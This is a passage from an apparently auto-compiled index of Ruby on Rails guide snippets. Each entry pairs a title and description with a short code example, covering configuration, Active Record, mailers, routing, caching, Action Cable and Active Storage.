Zeitwerk's logger to use the Rails logger, ensuring autoload logs integrate with the application's standard log output. This should be set within an initializer (e.g., 'config/initializers/log_autoloaders.rb'), as the Rails logger is not available during application boot. Requires an initialized Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/log_autoloaders.rb\nRails.autoloaders.logger = Rails.logger\n\n```\n\n----------------------------------------\n\nTITLE: Subscribing to Notifications with Event Object in Ruby\nDESCRIPTION: Demonstrates how to subscribe to the `process_action.action_controller` event using `ActiveSupport::Notifications.subscribe`. The provided block receives a single argument, an `ActiveSupport::Notifications::Event` object, which encapsulates all event details like name, duration (wall-clock time in ms), allocations, and the payload hash. This is useful for accessing comprehensive event data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.subscribe \"process_action.action_controller\" do |event|\n  event.name        # => \"process_action.action_controller\"\n  event.duration    # => 10 (in milliseconds)\n  event.allocations # => 1826\n  event.payload     # => {:extra=>information}\n\n  Rails.logger.info \"#{event} Received!\"\nend\n```\n\n----------------------------------------\n\nTITLE: ApplicationMailer Class Definition in Ruby\nDESCRIPTION: Defines the ApplicationMailer class that inherits from ActionMailer::Base and sets default values such as the from address and layout for all mailers in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# app/mailers/application_mailer.rb\nclass ApplicationMailer < ActionMailer::Base\n  default from: \"from@example.com\"\n  layout \"mailer\"\nend\n```\n\n----------------------------------------\n\nTITLE: Customizing I18n Load Path and Default Locale in Rails Application - Ruby\nDESCRIPTION: Illustrates changing the default locale and customizing the search path for translation files within Rails' config/application.rb. Demonstrates the use of Dir and Rails.root to dynamically add translation files from subdirectories. Key parameters: 'my/locales' directory for translations and a new default locale symbol (:de for German). Can be extended for different languages by adjusting path or locale. Required: Rails application environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.i18n.load_path += Dir[Rails.root.join(\"my\", \"locales\", \"*.{rb,yml}\")]\nconfig.i18n.default_locale = :de\n```\n\n----------------------------------------\n\nTITLE: Using class_name Option for Custom Model Names\nDESCRIPTION: Example showing how to use the class_name option when the associated model has a different name than what would be inferred from the association name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_108\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, class_name: \"Patron\"\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the priority using a block\nDESCRIPTION: This snippet shows how to dynamically set the priority for a job using a block with `queue_with_priority`. The block evaluates the video owner's premium status to determine the priority.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProcessVideoJob < ApplicationJob\n  queue_with_priority do\n    video = self.arguments.first\n    if video.owner.premium?\n      0\n    else\n      10\n    end\n  end\n\n  def perform(video)\n    # Process video\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nProcessVideoJob.perform_later(Video.last)\n```\n\n----------------------------------------\n\nTITLE: Generating Remote Forms with Unobtrusive JavaScript in Rails 3 - Ruby\nDESCRIPTION: Shows how to create forms using the 'form_for' helper with :remote => true, enabling unobtrusive JavaScript (UJS) features in Rails 3. This replaces the legacy inline AJAX helpers. There are no extra dependencies beyond Rails 3 UJS support; :remote key signals Rails to emit proper HTML data attributes. Input is a form builder with remote enabled, output is a form that performs AJAX submission.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nform_for @post, :remote => true\n```\n\n----------------------------------------\n\nTITLE: Overriding Routing Helper Names in Nested Resources in Rails\nDESCRIPTION: This code snippet demonstrates overriding routing helper names for nested resources using the `:as` option. It renames the helper for ads to `periodical_ads` in the magazine's ads route.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nresources :magazines do\n  resources :ads, as: \"periodical_ads\"\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with Asset Host in Ruby\nDESCRIPTION: Demonstrates the effect of setting `config.asset_host` on the `image_tag` helper. The generated `<img>` tag's `src` attribute points to the configured asset host.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nimage_tag(\"rails.png\")\n# => <img src=\"//assets.example.com/images/rails.png\" />\n```\n\n----------------------------------------\n\nTITLE: Destroying a User with ActiveRecord Callbacks\nDESCRIPTION: Illustrates the output when destroying a user with the defined destroy callbacks. The logs show the sequence of events triggered by the before_destroy, around_destroy, and after_destroy callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_18\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.find(1)\n=> #<User id: 1, email: \"john.doe@example.com\", created_at: \"2024-03-20 16:19:52.405195000 +0000\", updated_at: \"2024-03-20 16:19:52.405195000 +0000\", name: \"John Doe\", role: \"admin\">\n\nirb> user.destroy\nChecked the admin count\nAbout to destroy user with ID 1\nUser with ID 1 destroyed successfully\nNotification sent to other users about user deletion\n```\n\n----------------------------------------\n\nTITLE: Configuring Generators in Rails\nDESCRIPTION: This snippet showcases how to configure Rails generators to customize various aspects like ORM, test framework, and template engine. It demonstrates using the `config.generators` method with a block to set different generator options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.generators do |g|\n  g.orm :active_record\n  g.test_framework :test_unit\nend\n```\n\n----------------------------------------\n\nTITLE: Action Cable Subscription with Received Data Handling JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to create a subscription to a \"ChatChannel\" using Action Cable and how to handle the received data.  It defines functions to append a new line of chat to the chat room display.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/chat_channel.js\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create({ channel: \"ChatChannel\", room: \"Best Room\" }, {\n  received(data) {\n    this.appendLine(data)\n  },\n\n  appendLine(data) {\n    const html = this.createLine(data)\n    const element = document.querySelector(\"[data-chat-room='Best Room']\")\n    element.insertAdjacentHTML(\"beforeend\", html)\n  },\n\n  createLine(data) {\n    return `\n      <article class=\"chat-line\">\n        <span class=\"speaker\">${data[\"sent_by\"]}</span>\n        <span class=\"body\">${data[\"body\"]}</span>\n      </article>\n    `\n  }\n})\n```\n\n----------------------------------------\n\nTITLE: Configuring Postmark Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from Postmark. It must be placed within the application's production environment configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :postmark\n```\n\n----------------------------------------\n\nTITLE: Running Action Mailbox Database Migrations\nDESCRIPTION: This command runs the database migrations required for Action Mailbox and Active Storage. The migrations create the necessary tables for storing inbound emails and attachments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_1\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Executing Rails Commands Entry Point (Ruby)\nDESCRIPTION: This script (`bin/rails`) is the primary entry point for running Rails commands. It defines the `APP_PATH` constant pointing to `config/application.rb`, loads the application's boot configuration (`config/boot.rb`) which handles Bundler setup, and then requires the `rails/commands` library to parse and execute the requested command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n#!/usr/bin/env ruby\nAPP_PATH = File.expand_path(\"../config/application\", __dir__)\nrequire_relative \"../config/boot\"\nrequire \"rails/commands\"\n```\n\n----------------------------------------\n\nTITLE: Collection Caching with ERB\nDESCRIPTION: Caches individual templates rendered for a collection. Uses the `render` helper with `cached: true` to efficiently fetch and write cached templates for the collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_2\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= render partial: 'products/product', collection: @products, cached: true %>\n```\n\n----------------------------------------\n\nTITLE: Retrieving multiple last records in Rails\nDESCRIPTION: This code demonstrates how to retrieve multiple records from the `Customer` model using the `last` method with a numerical argument. It fetches the specified number of records ordered by the primary key in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_30\n\nLANGUAGE: irb\nCODE:\n```\nirb> customers = Customer.last(3)\n=> [#<Customer id: 219, first_name: \"James\">, #<Customer id: 220, first_name: \"Sara\">, #<Customer id: 221, first_name: \"Russel\">]\n```\n\n----------------------------------------\n\nTITLE: Calculating Years Ago using years_ago in Ruby\nDESCRIPTION: The `years_ago` method calculates a date in the past by a specified number of years. It takes an integer representing the number of years to subtract from the given date and returns the resulting date. If the resulting date is invalid (e.g., February 29th of a non-leap year), it returns the last day of the corresponding month.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_148\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.new(2010, 6, 7)\ndate.years_ago(10) # => Wed, 07 Jun 2000\n```\n\n----------------------------------------\n\nTITLE: Deleting Session-Related Middleware - Ruby\nDESCRIPTION: This Ruby code snippet in config/application.rb deletes session and cookie middleware from the stack, removing ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, and ActionDispatch::Flash. This impacts session and flash data features across the whole application. Inputs are the middleware classes to remove; outputs are modified server behavior with no session or flash support.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\nconfig.middleware.delete ActionDispatch::Cookies\\nconfig.middleware.delete ActionDispatch::Session::CookieStore\\nconfig.middleware.delete ActionDispatch::Flash\n```\n\n----------------------------------------\n\nTITLE: Configuring Exception Response Format - Rails Configuration - Ruby\nDESCRIPTION: Sets the format for exception responses in development mode via config.debug_exception_response_format in config/environments/development.rb. Use :default for HTML debugging pages, or :api to preserve the response format, useful in API-only Rails apps. The key parameter is a symbol, either :default or :api.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.debug_exception_response_format = :default\n```\n\n----------------------------------------\n\nTITLE: Enabling belongs_to Required by Default in Rails 5\nDESCRIPTION: Configuration to enable the new Rails 5 feature that makes belongs_to associations required by default. This can be set globally in an initializer or overridden per model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.belongs_to_required_by_default = true\n```\n\n----------------------------------------\n\nTITLE: Formatting Large Numbers with number_to_human in Ruby\nDESCRIPTION: Demonstrates the use of number_to_human helper to format and approximate large numbers for better readability.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_to_human(1234)    # => 1.23 Thousand\nnumber_to_human(1234567) # => 1.23 Million\n```\n\n----------------------------------------\n\nTITLE: Counting specific records with count in Rails\nDESCRIPTION: Demonstrates how to use `count` with a column name to count the number of records where that column has a non-null value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_204\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.count(:title)\n```\n\n----------------------------------------\n\nTITLE: Converting Array to XML (Ruby)\nDESCRIPTION: This snippet shows how to convert an array to an XML representation using the `to_xml` method. It demonstrates the default behavior of using the class name of the first element to create the root node.  It showcases output for both homogenous and heterogenous arrays and options to customize the output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_126\n\nLANGUAGE: ruby\nCODE:\n```\nContributor.limit(2).order(:rank).to_xml\n# =>\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <contributors type=\"array\">\n#   <contributor>\n#     <id type=\"integer\">4356</id>\n#     <name>Jeremy Kemper</name>\n#     <rank type=\"integer\">1</rank>\n#     <url-id>jeremy-kemper</url-id>\n#   </contributor>\n#   <contributor>\n#     <id type=\"integer\">4404</id>\n#     <name>David Heinemeier Hansson</name>\n#     <rank type=\"integer\">2</rank>\n#     <url-id>david-heinemeier-hansson</url-id>\n#   </contributor>\n# </contributors>\n```\n\nLANGUAGE: ruby\nCODE:\n```\n[Contributor.first, Commit.first].to_xml\n# =>\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <objects type=\"array\">\n#   <object>\n#     <id type=\"integer\">4583</id>\n#     <name>Aaron Batalion</name>\n#     <rank type=\"integer\">53</rank>\n#     <url-id>aaron-batalion</url-id>\n#   </object>\n#   <object>\n#     <author>Joshua Peek</author>\n#     <authored-timestamp type=\"datetime\">2009-09-02T16:44:36Z</authored-timestamp>\n#     <branch>origin/master</branch>\n#     <committed-timestamp type=\"datetime\">2009-09-02T16:44:36Z</committed-timestamp>\n#     <committer>Joshua Peek</committer>\n#     <git-show nil=\"true\"></git-show>\n#     <id type=\"integer\">190316</id>\n#     <imported-from-svn type=\"boolean\">false</imported-from-svn>\n#     <message>Kill AMo observing wrap_with_notifications since ARes was only using it</message>\n#     <sha1>723a47bfb3708f968821bc969a9a3fc873a3ed58</sha1>\n#   </object>\n# </objects>\n```\n\nLANGUAGE: ruby\nCODE:\n```\n[{ a: 1, b: 2 }, { c: 3 }].to_xml\n# =>\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <objects type=\"array\">\n#   <object>\n#     <b type=\"integer\">2</b>\n#     <a type=\"integer\">1</a>\n#   </object>\n#   <object>\n#     <c type=\"integer\">3</c>\n#   </object>\n# </objects>\n```\n\nLANGUAGE: ruby\nCODE:\n```\nContributor.limit(2).order(:rank).to_xml(skip_types: true)\n# =>\n# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n# <contributors>\n#   <contributor>\n#     <id>4356</id>\n#     <name>Jeremy Kemper</name>\n#     <rank>1</rank>\n#     <url-id>jeremy-kemper</url-id>\n#   </contributor>\n#   <contributor>\n#     <id>4404</id>\n#     <name>David Heinemeier Hansson</name>\n#     <rank>2</rank>\n#     <url-id>david-heinemeier-hansson</url-id>\n#   </contributor>\n# </contributors>\n```\n\n----------------------------------------\n\nTITLE: Creating Generator Using Rails Generator\nDESCRIPTION: Command sequence to generate a new generator using Rails' built-in generator generator\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ rm lib/generators/initializer_generator.rb\n\n$ bin/rails generate generator initializer\n      create  lib/generators/initializer\n      create  lib/generators/initializer/initializer_generator.rb\n      create  lib/generators/initializer/USAGE\n      create  lib/generators/initializer/templates\n      invoke  test_unit\n      create    test/lib/generators/initializer_generator_test.rb\n```\n\n----------------------------------------\n\nTITLE: Redirect to Action Example (Rails/Ruby)\nDESCRIPTION: This example shows how to redirect to the `index` action from the `show` action when a book is not found. This ensures that the `index` action's code is executed, setting up the necessary instance variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\ndef index\n  @books = Book.all\nend\n\ndef show\n  @book = Book.find_by(id: params[:id])\n  if @book.nil?\n    redirect_to action: :index\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Form with PATCH method in Ruby\nDESCRIPTION: This Ruby code uses `form_with` helper to create a form with PATCH method, which Rails emulates using a hidden input field named `_method`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nform_with(url: search_path, method: \"patch\")\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for process.action_mailer in Ruby\nDESCRIPTION: This snippet illustrates the payload for the `process.action_mailer` event, fired when a mailer action is processed. The Ruby hash includes the `:mailer` class name, the specific `:action` being invoked, and any `:args` passed to that action method as an array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  mailer: \"Notification\",\n  action: \"welcome_email\",\n  args: []\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial with Collection for Template Caching\nDESCRIPTION: This example demonstrates the proper way to render a partial with a collection to enable template caching. Using partial: and collection: allows Rails to automatically manage dependencies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nrender partial: \"documents/document\", collection: @project.documents.where(published: true)\n```\n\n----------------------------------------\n\nTITLE: Checking String Safety with html_safe?\nDESCRIPTION: This Ruby code demonstrates how to check if a string is HTML safe using the `html_safe?` method. By default, strings are considered unsafe. The `html_safe?` method returns `true` if the string is marked as safe, and `false` otherwise.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\n\"\".html_safe? # => false\n```\n\n----------------------------------------\n\nTITLE: Creating a User in Production Rails Console\nDESCRIPTION: This Ruby code snippet creates a new user in the production database through the Rails console. It sets the email address, password, and password confirmation for the user.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_136\n\nLANGUAGE: ruby\nCODE:\n```\nstore(prod)> User.create!(email_address: \"you@example.org\", password: \"s3cr3t\", password_confirmation: \"s3cr3t\")\n```\n\n----------------------------------------\n\nTITLE: Generating Full URL with url_for Helper in Action Mailer (ERB)\nDESCRIPTION: This snippet calls the url_for helper in an ERB template, passing the host, controller, and action explicitly. Required if there is no global default_url_options configuration. It produces a fully qualified URL for use in emails and other contexts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_19\n\nLANGUAGE: erb\nCODE:\n```\n<%= url_for(host: 'example.com',\n            controller: 'welcome',\n            action: 'greeting') %>\n```\n\n----------------------------------------\n\nTITLE: Removing Scoping with unscoped block in Rails\nDESCRIPTION: This snippet shows how `unscoped` can be used with a block to temporarily remove scoping within the block. It's useful for isolating scoping changes to a specific part of the code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_174\n\nLANGUAGE: ruby\nCODE:\n```\nBook.unscoped { Book.out_of_print }\n```\n\n----------------------------------------\n\nTITLE: Creating Deep Copies with `deep_dup`\nDESCRIPTION: This snippet demonstrates how to use `deep_dup` to create a deep copy of an object, including nested objects. This ensures that changes to the duplicated object do not affect the original object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\narray     = [\"string\"]\nduplicate = array.deep_dup\n\nduplicate.first.gsub!(\"string\", \"foo\")\n\narray     # => [\"string\"]\nduplicate # => [\"foo\"]\n```\n\n----------------------------------------\n\nTITLE: Mounting Rails Engine in Application Routes (Ruby)\nDESCRIPTION: Adds a line to the host application's `config/routes.rb` file to mount the `Blorgh::Engine`. The `mount` keyword maps the engine's routes to a specific path (`/blog`) within the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nmount Blorgh::Engine, at: \"/blog\"\n```\n\n----------------------------------------\n\nTITLE: Using Partials to Simplify Views\nDESCRIPTION: This code snippet demonstrates how to use partials to simplify views by moving details out of the main view file. `_ad_banner.html.erb` and `_footer.html.erb` would contain content shared by many pages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_71\n\nLANGUAGE: erb\nCODE:\n```\n<%= render \"application/ad_banner\" %>\n\n<h1>Products</h1>\n\n<p>Here are a few of our fine products:</p>\n<%# ... %>\n\n<%= render \"application/footer\" %>\n```\n\n----------------------------------------\n\nTITLE: Low-Level Caching with Rails.cache\nDESCRIPTION: Implements low-level caching using `Rails.cache.fetch` to cache the result of a method that retrieves a product's price from a competing website. The cache key includes the product's class name, ID, and updated_at timestamp.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  def competing_price\n    Rails.cache.fetch(\"#{cache_key_with_version}/competing_price\", expires_in: 12.hours) do\n      Competitor::API.find_price(id)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Add Column with Index Migration (Bash)\nDESCRIPTION: This command generates a migration to add a 'part_number' column of type string to the 'products' table, and adds an index to the new column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration AddPartNumberToProducts part_number:string:index\n```\n\n----------------------------------------\n\nTITLE: Squishing Whitespace with squish\nDESCRIPTION: This Ruby code demonstrates the `squish` method, which removes leading and trailing whitespace from a string and replaces runs of whitespace characters with a single space. It handles both ASCII and Unicode whitespace. There's also the destructive version `squish!`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\n\" \\n  foo\\n\\r \\t bar \\n\".squish # => \"foo bar\"\n```\n\n----------------------------------------\n\nTITLE: Attaching File with Custom S3 Key/Path in Rails\nDESCRIPTION: Demonstrates attaching a file with a custom key parameter that specifies the path within an S3 bucket. This helps organize files in the storage service by environment and content type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(\n  io: File.open(\"/path/to/file\"),\n  filename: \"file.pdf\",\n  content_type: \"application/pdf\",\n  key: \"#{Rails.env}/blog_content/intuitive_filename.pdf\",\n  identify: false\n)\n```\n\n----------------------------------------\n\nTITLE: Inspecting the Middleware Stack with bin/rails middleware - Bash\nDESCRIPTION: This snippet shows how to inspect the current Rails application's middleware stack by running bin/rails middleware from the command line. This command outputs the ordered list of middleware used in the application, which is essential for debugging or understanding middleware organization. No inputs are required beyond a functional Rails environment. The output is a console printout of the middleware chain.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails middleware\n```\n\n----------------------------------------\n\nTITLE: Broadcast Message to Channel Ruby\nDESCRIPTION: This Ruby code broadcasts a message to a chat channel. It's designed to be called from somewhere within the application, perhaps a NewCommentJob, and sends a message containing the sender's name and the message body to the specified room.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_18\n\nLANGUAGE: Ruby\nCODE:\n```\n# Somewhere in your app this is called, perhaps\n# from a NewCommentJob.\nActionCable.server.broadcast(\n  \"chat_#{room}\",\n  {\n    sent_by: \"Paul\",\n    body: \"This is a cool chat app.\"\n  }\n)\n```\n\n----------------------------------------\n\nTITLE: Rendering Custom Templates and Inline Content in Action Mailer (Ruby)\nDESCRIPTION: This snippet shows a Rails mailer action using a block with the mail method to specify different template rendering for HTML and plain text formats. It demonstrates rendering an alternate template for HTML and rendering inline text for plain text. Dependencies include ApplicationMailer and access to the render method within the mail format block. Supports advanced rendering options such as :plain and template name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  default from: \"notifications@example.com\"\n\n  def welcome_email\n    @user = params[:user]\n    @url  = \"http://example.com/login\"\n    mail(to: @user.email,\n         subject: \"Welcome to My Awesome Site\") do |format|\n      format.html { render \"another_template\" }\n      format.text { render plain: \"hello\" }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Conditional GET with stale? for Caching - Rails Controller Example - Ruby\nDESCRIPTION: Implements HTTP caching in a controller action with the stale? method and the If-Modified-Since header, using the resource's last update time. If the content is stale, renders the JSON representation; otherwise, returns a 304 Not Modified response. Rails' caching infrastructure and Rack::Cache are prerequisites.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\ndef show\n  @post = Post.find(params[:id])\n\n  if stale?(last_modified: @post.updated_at)\n    render json: @post\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Start Rails Server\nDESCRIPTION: This command starts the Rails web server (Puma by default), which listens for incoming HTTP requests and serves the application.  It requires the application to be properly configured and the necessary gems to be installed. It starts the server in development mode by default, listening on localhost port 3000.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails server\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailer Defaults in Ruby\nDESCRIPTION: This code snippet demonstrates how to configure default options for Action Mailer, such as `mime_version`, `charset`, `content_type`, and `parts_order`. It initializes a hash with these default values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  mime_version:  \"1.0\",\n  charset:       \"UTF-8\",\n  content_type: \"text/plain\",\n  parts_order:  [\"text/plain\", \"text/enriched\", \"text/html\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Building Associated Object via build_association - Ruby\nDESCRIPTION: Creates a new Author object associated with a Book (but does not save it to the database). The instantiated object is returned and linked via the foreign key, with initial attributes passed. ActiveRecord must be included; attributes like author_number and author_name are required parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n@author = @book.build_author(author_number: 123,\\n                             author_name: \\\"John Doe\\\")\n```\n\n----------------------------------------\n\nTITLE: Displaying Login Link Conditionally (Unauthenticated Users) - ERB\nDESCRIPTION: This snippet adds a 'Login' link to the navbar that appears only when the user is not authenticated. It utilizes the `authenticated?` helper and the `unless` keyword for conditional rendering in the ERB template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_74\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to \"Login\", new_session_path unless authenticated? %>\n```\n\n----------------------------------------\n\nTITLE: Time Calculations with Integer Extensions in Ruby\nDESCRIPTION: This code shows how to use the `months` and `years` extensions to the Integer class for time declarations and calculations. These methods enable expressing time durations like `4.months + 5.years`, which can be added to or subtracted from Time objects. This is defined in `active_support/core_ext/integer/time.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_108\n\nLANGUAGE: ruby\nCODE:\n```\n# equivalent to Time.current.advance(months: 1)\n1.month.from_now\n\n# equivalent to Time.current.advance(years: 2)\n2.years.from_now\n\n# equivalent to Time.current.advance(months: 4, years: 5)\n(4.months + 5.years).from_now\n```\n\n----------------------------------------\n\nTITLE: Generating Unique S3 File Keys in Rails\nDESCRIPTION: Shows a method for generating unique S3 file keys by combining a path structure with a UUID. This ensures unique filenames when uploading to S3 storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\ndef s3_file_key\n  \"#{Rails.env}/blog_content/intuitive_filename-#{SecureRandom.uuid}.pdf\"\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Direct Route in Rails\nDESCRIPTION: This snippet demonstrates how to create a custom URL helper using the `direct` method in Rails. It defines a direct route named `homepage` that returns a string URL. This URL can be accessed using `homepage_url`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\ndirect :homepage do\n  \"https://rubyonrails.org\"\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Turbo Frame in ERB\nDESCRIPTION: Example of using the turbo_frame_tag helper in an ERB template to create a Turbo Frame for a post object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_7\n\nLANGUAGE: erb\nCODE:\n```\n<%= turbo_frame_tag dom_id(post) do %>\n  <div>\n     <%= link_to post.title, post_path(post) %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Low-Level Caching: Read from Cache\nDESCRIPTION: Demonstrates reading a value from the cache using `Rails.cache.read`.  The value stored with the key \"greeting\" is retrieved.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# Retrieve the value from the cache\ngreeting = Rails.cache.read(\"greeting\")\nputs greeting # Output: Hello, world!\n```\n\n----------------------------------------\n\nTITLE: Using ActiveSupport::TaggedLogging for Contextual Logging in Ruby\nDESCRIPTION: Demonstrates how to use `ActiveSupport::TaggedLogging` to add contextual tags (like user IDs, request IDs, or subdomains) to log entries. This helps in filtering and analyzing logs, especially in multi-tenant or complex applications. The example shows creating a tagged logger and applying single or multiple tags using the `tagged` block method.\nSOURCE: 